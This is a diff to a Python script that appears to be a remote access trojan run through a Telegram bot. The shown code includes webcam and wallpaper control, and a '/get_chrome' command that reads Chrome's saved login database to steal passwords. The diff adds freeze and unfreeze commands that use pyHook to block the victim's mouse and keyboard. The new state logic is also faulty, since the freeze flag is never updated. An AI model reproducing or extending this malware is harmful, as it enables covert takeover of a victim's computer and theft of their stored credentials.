@@ -33,6 +33,10 @@ import urllib# wallpaper
 import cv2#webcam
 from ctypes import * #fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
+#For freezing the almighty mouse
+global mouseFrozen
+mouseFrozen = False
+
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 token = 'xx:xx' # you can set your environment variable as well
@@ -299,18 +303,31 @@ def handle(msg):
                                 else:
                                         response += 'enabled'
                         elif command.endswith('freeze_mouse'):
-                                global mouseFrozen
-                                                        
-                                mse = pyHook.HookManager()
-                                mse.MouseAll = false_event
-                                mse.KeyAll = false_event
-                                mse.HookMouse()
-                                mse.HookKeyboard()
-                                pythoncom.PumpMessages()
-                                if mouseFrozen:
-                                        response += 'disabled. To enable, use /unfreeze_mouse'
+                                if mouseFrozen == False:                                                   
+                                        mse = pyHook.HookManager()
+                                        mse.MouseAll = false_event
+                                        mse.KeyAll = false_event
+                                        mse.HookMouse()
+                                        mse.HookKeyboard()
+                                        pythoncom.PumpMessages()
+                                        response += 'enabled. To disable use /unfreeze_mouse'
+                                elif mouseFrozen == True:
+                                        response += 'enabled. To disable, use /unfreeze_mouse'
                                 else:
-                                        response += 'enabled'
+                                        response += 'The script has commited the act of death'
+                        elif command.endswith('unfreeze_mouse'):
+                                if mouseFrozen == True:                                                   
+                                        mse = pyHook.HookManager()
+                                        mse.MouseAll = true_event
+                                        mse.KeyAll = true_event
+                                        mse.HookMouse()
+                                        mse.HookKeyboard()
+                                        pythoncom.PumpMessages()
+                                        response += 'disabled. To enable use /freeze_mouse'
+                                elif mouseFrozen == False:
+                                        response += 'already disabled. To enable, use /freeze_mouse'
+                                else:
+                                        response += 'The script has commited the act of death'
                         elif command == '/get_chrome':
                                 con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                                 cursor = con.cursor()
